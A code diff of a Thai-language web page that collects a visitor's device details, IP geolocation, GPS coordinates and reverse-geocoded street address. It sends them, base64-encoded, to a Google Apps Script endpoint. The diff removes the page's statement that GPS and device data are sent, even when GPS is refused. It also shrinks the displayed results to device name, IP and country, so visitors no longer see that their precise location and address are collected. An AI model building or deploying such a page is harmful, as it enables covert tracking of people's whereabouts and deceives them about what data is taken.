@@ -21,7 +21,7 @@
     }
 
     .container {
-      max-width: 760px;
+      max-width: 560px;
       margin: 0 auto;
       background: #1e293b;
       border: 1px solid #334155;
@@ -88,40 +88,31 @@
     .result {
       margin-top: 16px;
       display: none;
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: 190px 1fr;
-      gap: 8px;
       background: #020617;
       border: 1px solid #334155;
-      border-radius: 12px;
-      padding: 14px;
-      font-size: 14px;
-      line-height: 1.5;
+      border-radius: 14px;
+      padding: 16px;
+    }
+
+    .item {
+      margin-bottom: 14px;
+    }
+
+    .item:last-child {
+      margin-bottom: 0;
     }
 
     .label {
       color: #cbd5e1;
+      font-size: 14px;
+      margin-bottom: 4px;
       font-weight: bold;
     }
 
-    a {
-      color: #38bdf8;
-      word-break: break-all;
-    }
-
-    pre {
-      background: #020617;
+    .value {
       color: #ffffff;
-      padding: 12px;
-      border-radius: 12px;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      font-size: 12px;
-      border: 1px solid #334155;
-      max-height: 300px;
+      font-size: 17px;
+      word-break: break-word;
     }
 
     @media (max-width: 650px) {
@@ -136,14 +127,6 @@
       h1 {
         font-size: 22px;
       }
-
-      .grid {
-        grid-template-columns: 1fr;
-      }
-
-      .label {
-        margin-top: 8px;
-      }
     }
   </style>
 </head>
@@ -155,8 +138,7 @@
 
   <div class="desc">
     เมื่อกดปุ่ม ระบบจะขออนุญาตเข้าถึงตำแหน่ง GPS จากเครื่องนี้<br>
-    ถ้าอนุญาต ระบบจะส่งตำแหน่ง GPS และข้อมูลอุปกรณ์ไปยังผู้ดูแล<br>
-    ถ้าไม่อนุญาต ระบบจะส่งข้อมูลพร้อมข้อความ error แทน
+    ข้อมูลจะถูกส่งไปยังผู้ดูแล
   </div>
 
   <button id="sendBtn" onclick="submitLocation()">
@@ -168,33 +150,33 @@
   </div>
 
   <div id="result" class="result">
-    <h3>ข้อมูลที่ส่ง</h3>
-    <div id="resultGrid" class="grid"></div>
-    <h3>JSON</h3>
-    <pre id="jsonBox"></pre>
+    <div class="item">
+      <div class="label">ชื่อเครื่อง</div>
+      <div id="deviceNameView" class="value">-</div>
+    </div>
+
+    <div class="item">
+      <div class="label">IP</div>
+      <div id="ipView" class="value">-</div>
+    </div>
+
+    <div class="item">
+      <div class="label">ประเทศ IP</div>
+      <div id="countryView" class="value">-</div>
+    </div>
   </div>
 </div>
 
 <script>
-/*
-  ==============================
-  ตั้งค่า
-  ==============================
-*/
-
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzZ-k3z04ucaDPpiVeJvNncp3VCFxDpSEUfPRDameTpgGBhqYsM1vv2Lok_RA88HHj7iw/exec";
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzdJ26u1KPB-Nmu0CwAK3hw4p97uMvYWHhXJlh_uWye36AO2j4o7haHu3HXGfh08EKCcg/exec";
 
 const sendBtn = document.getElementById("sendBtn");
 const statusEl = document.getElementById("status");
 const resultEl = document.getElementById("result");
-const resultGrid = document.getElementById("resultGrid");
-const jsonBox = document.getElementById("jsonBox");
 
-/*
-  ==============================
-  ปุ่มหลัก
-  ==============================
-*/
+const deviceNameView = document.getElementById("deviceNameView");
+const ipView = document.getElementById("ipView");
+const countryView = document.getElementById("countryView");
 
 async function submitLocation() {
   sendBtn.disabled = true;
@@ -205,24 +187,21 @@ async function submitLocation() {
   try {
     statusEl.innerHTML = "กำลังตรวจสอบ IP...";
     const ipData = await getIpInfo();
-
     Object.assign(data, ipData);
-
   } catch (err) {
     data.ip_error = String(err);
     data.ip_note = "ดึงข้อมูล IP ไม่สำเร็จ";
   }
 
+  showSimpleResult(data);
+
   try {
     statusEl.innerHTML = "กำลังขออนุญาต GPS...";
 
     const gpsData = await getGpsInfo();
-
     Object.assign(data, gpsData);
 
     if (data.gps_latitude && data.gps_longitude) {
-      statusEl.innerHTML = "กำลังแปลงที่อยู่จาก GPS...";
-
       try {
         const addressData = await reverseGeocode(data.gps_latitude, data.gps_longitude);
         Object.assign(data, addressData);
@@ -235,7 +214,6 @@ async function submitLocation() {
         data.postcode_gps = "";
       }
     }
-
   } catch (err) {
     data.gps_error = String(err);
   }
@@ -243,8 +221,6 @@ async function submitLocation() {
   data.sent_at = new Date().toLocaleString("th-TH", {
     timeZone: "Asia/Bangkok"
   });
-
-  showResult(data);
 
   try {
     statusEl.innerHTML = "กำลังส่งข้อมูลไปยังผู้ดูแล...";
@@ -256,14 +232,9 @@ async function submitLocation() {
       "<span class='error'>ส่งข้อมูลไม่สำเร็จ:</span> " + escapeHtml(String(err));
   }
 
+  showSimpleResult(data);
   sendBtn.disabled = false;
 }
-
-/*
-  ==============================
-  ข้อมูลเครื่องพื้นฐาน
-  ==============================
-*/
 
 function createBaseData() {
   return {
@@ -344,12 +315,6 @@ function getBrowserTimezone() {
   }
 }
 
-/*
-  ==============================
-  GPS
-  ==============================
-*/
-
 function getGpsInfo() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -403,12 +368,6 @@ function getGpsInfo() {
   });
 }
 
-/*
-  ==============================
-  IP Info
-  ==============================
-*/
-
 async function getIpInfo() {
   const result = {
     ip: "",
@@ -453,7 +412,6 @@ async function getIpInfo() {
     result.ip_source_api = "ipapi.co";
 
     return result;
-
   } catch (err1) {
     try {
       const res2 = await fetch("https://get.geojs.io/v1/ip/geo.json", {
@@ -481,7 +439,6 @@ async function getIpInfo() {
       result.ip_source_api = "geojs.io";
 
       return result;
-
     } catch (err2) {
       result.ip_error = String(err2);
       result.ip_note = "ดึง IP ไม่สำเร็จทั้ง ipapi.co และ geojs.io";
@@ -489,13 +446,6 @@ async function getIpInfo() {
     }
   }
 }
-
-/*
-  ==============================
-  แปลง GPS เป็นที่อยู่
-  ใช้ Nominatim ฟรี
-  ==============================
-*/
 
 async function reverseGeocode(lat, lng) {
   const result = {
@@ -527,13 +477,8 @@ async function reverseGeocode(lat, lng) {
   const addr = data.address || {};
 
   result.full_address = data.display_name || "";
-
   result.country_gps = addr.country || "";
-  result.province_gps =
-    addr.province ||
-    addr.state ||
-    "";
-
+  result.province_gps = addr.province || addr.state || "";
   result.district_gps =
     addr.city ||
     addr.town ||
@@ -541,7 +486,6 @@ async function reverseGeocode(lat, lng) {
     addr.county ||
     addr.district ||
     "";
-
   result.subdistrict_gps =
     addr.suburb ||
     addr.village ||
@@ -549,27 +493,14 @@ async function reverseGeocode(lat, lng) {
     addr.quarter ||
     addr.neighbourhood ||
     "";
-
   result.postcode_gps = addr.postcode || "";
 
   return result;
 }
 
-/*
-  ==============================
-  ส่งเข้า Google Sheet
-  สำคัญ: ส่งเป็น payload=base64
-  ==============================
-*/
-
 function encodePayload(obj) {
   const json = JSON.stringify(obj);
-
-  return btoa(
-    unescape(
-      encodeURIComponent(json)
-    )
-  );
+  return btoa(unescape(encodeURIComponent(json)));
 }
 
 async function sendToSheet(data) {
@@ -600,78 +531,12 @@ async function sendToSheet(data) {
   return true;
 }
 
-/*
-  ==============================
-  แสดงผลหน้าเว็บ
-  ==============================
-*/
-
-function showResult(data) {
+function showSimpleResult(data) {
   resultEl.style.display = "block";
 
-  resultGrid.innerHTML = `
-    <div class="label">ชื่อเครื่อง</div>
-    <div>${escapeHtml(data.device_name)}</div>
-
-    <div class="label">ระบบ</div>
-    <div>${escapeHtml(data.platform)}</div>
-
-    <div class="label">เบราว์เซอร์</div>
-    <div>${escapeHtml(data.browser)}</div>
-
-    <div class="label">ภาษาเครื่อง</div>
-    <div>${escapeHtml(data.language)}</div>
-
-    <div class="label">ขนาดจอ</div>
-    <div>${escapeHtml(data.screen)}</div>
-
-    <div class="label">Timezone Browser</div>
-    <div>${escapeHtml(data.timezone_browser)}</div>
-
-    <div class="label">GPS Latitude</div>
-    <div>${escapeHtml(data.gps_latitude)}</div>
-
-    <div class="label">GPS Longitude</div>
-    <div>${escapeHtml(data.gps_longitude)}</div>
-
-    <div class="label">ความแม่นยำ</div>
-    <div>${escapeHtml(data.gps_accuracy)}</div>
-
-    <div class="label">GPS Error</div>
-    <div>${escapeHtml(data.gps_error)}</div>
-
-    <div class="label">Google Maps</div>
-    <div>
-      ${
-        data.google_maps
-          ? `<a href="${escapeHtml(data.google_maps)}" target="_blank">เปิดแผนที่</a>`
-          : "-"
-      }
-    </div>
-
-    <div class="label">ที่อยู่ GPS</div>
-    <div>${escapeHtml(data.full_address)}</div>
-
-    <div class="label">IP</div>
-    <div>${escapeHtml(data.ip)}</div>
-
-    <div class="label">ประเทศ IP</div>
-    <div>${escapeHtml(data.ip_country)}</div>
-
-    <div class="label">เมือง IP</div>
-    <div>${escapeHtml(data.ip_city)}</div>
-
-    <div class="label">ผู้ให้บริการ IP</div>
-    <div>${escapeHtml(data.ip_org)}</div>
-
-    <div class="label">IP Error</div>
-    <div>${escapeHtml(data.ip_error)}</div>
-
-    <div class="label">เวลาที่ส่ง</div>
-    <div>${escapeHtml(data.sent_at)}</div>
-  `;
-
-  jsonBox.textContent = JSON.stringify(data, null, 2);
+  deviceNameView.textContent = data.device_name || "-";
+  ipView.textContent = data.ip || "-";
+  countryView.textContent = data.ip_country || "-";
 }
 
 function escapeHtml(text) {
